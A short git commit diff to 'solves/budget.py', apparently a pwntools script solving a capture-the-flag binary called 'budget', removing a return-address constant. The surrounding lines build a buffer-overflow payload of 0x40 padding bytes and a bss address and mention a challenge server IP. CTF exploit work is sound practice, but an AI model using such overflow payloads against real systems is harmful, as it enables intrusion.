721630a56055e32efe1d58ff648e20f0bd63b685
Y.Qudah <67742803+yousefgalqudah@users.noreply.github.com>
2026-01-01 22:44:24 +0300

    Update budget.py

--- solves/budget.py
+++ solves/budget.py
@@ -5,7 +5,6 @@ p = process("./budget")
 #p = remote('20.199.41.155', 5052)
 addr = elf.symbols["__bss_start"]
 print(hex(addr))
-ret_target = 0x40115b
 payload =flat(
     b"A" * 0x40,
     p64(elf.bss() + 0x200),
